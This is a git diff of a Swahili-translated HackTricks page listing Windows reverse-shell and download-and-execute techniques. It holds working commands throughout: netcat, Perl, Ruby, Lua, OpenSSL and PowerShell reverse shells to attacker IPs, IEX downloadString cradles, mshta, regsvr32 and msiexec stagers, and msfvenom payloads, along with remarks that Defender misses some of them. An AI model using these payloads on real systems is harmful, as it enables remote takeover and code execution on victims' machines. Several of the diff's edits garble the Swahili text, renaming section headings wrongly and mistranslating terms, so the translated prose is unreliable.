@@ -8,7 +8,7 @@ Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
@@ -16,7 +16,7 @@ Njia nyingine za kusaidia HackTricks:
 
 **Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ Njia nyingine za kusaidia HackTricks:
 ## Lolbas
 
 Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni kwa Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni kwa linux.\
-Kwa dhahiri, **hakuna faili za SUID au mamlaka ya sudo kwenye Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binari** zinaweza kutumika (kwa ubaya) kutekeleza aina fulani ya hatua zisizotarajiwa kama **kutekeleza nambari za aina yoyote.**
+Kwa dhahiri, **hakuna faili za SUID au mamlaka ya sudo kwenye Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binari** zinaweza kutumika (kwa ubaya) kutekeleza aina fulani ya hatua zisizotarajiwa kama **kutekeleza nambari za kupindukia.**
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat uliounganifu na salama**. Inafanya kazi kwenye mifumo inayofanana na Unix na Win32. Ikiwa na sifa kama encryption imara, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na uunganisho endelevu, sbd hutoa suluhisho la kipekee kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka usambazaji wa Kali Linux linaweza kutumika kama mbadala thabiti wa Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat ulioumovu na salama**. Inafanya kazi kwenye mifumo inayofanana na Unix na Win32. Ikiwa na sifa kama encryption imara, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na uunganisho endelevu, sbd hutoa suluhisho la kipekee kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka usambazaji wa Kali Linux linaweza kutumika kama mbadala thabiti wa Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -52,22 +52,21 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kujenga shellcode kwa mifumo ya Windows.
+Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kujenga shellcode kwa mifumo ya Windows. Perl inatoa maktaba yenye nguvu ya kazi ambazo zinaweza kutumiwa kwa ufanisi kushughulikia mifumo ya faili, sockets, na taratibu za mfumo. Matumizi ya Perl yanaweza kusaidia katika kujenga shellcode yenye nguvu na yenye ufanisi kwa mifumo ya Windows.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-### Swahili Translation
-## Ruby
+## Kijani
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-## Lua
+## Kiswahili
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -79,7 +78,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mnufaika
+Mnajisi
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -94,17 +93,17 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Mchakato unaoendesha wito wa mtandao: **powershell.exe**\
+Mchakato unatekeleza wito wa mtandao: **powershell.exe**\
 Mzigo ulioandikwa kwenye diski: **HAPANA** (_angalau mahali popote nilipoweza kupata kwa kutumia procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Mchakato unaoendesha wito wa mtandao: **svchost.exe**\
-Mzigo ulioandikwa kwenye diski: **Hifadhi ya ndani ya mteja wa WebDAV**
+Mchakato unafanya wito wa mtandao: **svchost.exe**\
+Payload iliyoandikwa kwenye diski: **Hifadhi ya ndani ya mteja wa WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Pata habari zaidi kuhusu Shells tofauti za Powershell mwishoni mwa hati hii**
+**Pata habari zaidi kuhusu Mabakuli tofauti ya Powershell mwishoni mwa hati hii**
 
 ## Mshta
 
@@ -124,7 +123,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi sana mzimu wa Koadic ukitumia stager hta**
+**Unaweza kupakua & kutekeleza kwa urahisi sana zomu ya Koadic kwa kutumia stager hta**
 
 #### mfano wa hta
 
@@ -263,7 +262,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi sana koadic zombie ukitumia stager regsvr**
+**Unaweza kupakua na kutekeleza kwa urahisi sana kizimbe cha Koadic kwa kutumia stager regsvr**
 
 ## Certutil
 
@@ -295,7 +294,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Mchakato unaoendesha wito wa mtandao: **svchost.exe**\
-Mzigo ulioandikwa kwenye diski: **Hifadhi ya muda ya mteja wa WebDAV**
+Mzigo ulioandikwa kwenye diski: **Hifadhi ya ndani ya mteja wa WebDAV**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -313,11 +312,11 @@ Mshambuliaji
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Mfano:
+Mnajisi:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Imebainika**
+**Imegundulika**
 
 ## **Wmic**
 
@@ -348,7 +347,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 Unaweza kutumia mbinu hii kukiuka Orodha ya Maombi na vizuizi vya Powershell.exe. Kama utaulizwa na kifaa cha PS shell.\
-Pakua hii na kuitekeleza: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Pakua hii na itekeleze: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -390,7 +389,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Katika folda ya **Mabakuli**, kuna mabakuli mengi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_ fanya nakala ya hati na ongeza mwishoni mwa faili:
+Katika folda ya **Mabakuli**, kuna mabakuli mengi tofauti. Kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_ fanya nakala ya hati na ongeza mwishoni mwa faili:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -398,7 +397,7 @@ Anza kutumikia script kwenye seva ya wavuti na uitekeleze kwenye mwisho wa muath
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender haiichunguzi kama msimbo mbaya (bado, 3/04/2019).
+Defender haiigundui kama msimbo mbaya (bado, 3/04/2019).
 
 **TODO: Angalia mabaka mengine ya nishang**
 
@@ -406,13 +405,13 @@ Defender haiichunguzi kama msimbo mbaya (bado, 3/04/2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Pakua, anzisha mtandao wa wavuti, anzisha msikilizaji, na itekeleze kwenye mwisho wa mhanga:
+Pakua, anzisha mtandao wa wavuti, anzisha msikilizaji, na tekeleza kwenye mwisho wa mhanga:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender haiigundui kama msimbo mbaya (bado, 3/04/2019).
+Defender haiigundui kama nambari inayoweza kudhuru (bado, 3/04/2019).
 
-**Chaguo nyingine zinazotolewa na powercat:**
+**Chaguo zingine zinazotolewa na powercat:**
 
 Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
@@ -445,7 +444,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Tengeneza toleo la powershell la mlango wa nyuma wa metasploit kwa kutumia kifaa cha unicorn
+Tengeneza toleo la powershell la mlango wa nyuma wa metasploit kwa kutumia kifaa cha kichawi
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -461,9 +460,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Zaidi
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console na moduli za PS zenye madhara zilizopakiwa mapema (zilizofichwa)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console na moduli za PS zenye mashambulizi zilizopakiwa mapema (zilizofichwa)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS console na moduli za PS zenye madhara na uchunguzi wa proksi (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS console na moduli za PS zenye mashambulizi na uchunguzi wa proksi (IEX)
 
 ## Marejeo
 
@@ -477,7 +476,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console na moduli za PS zen
 ​
 **Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
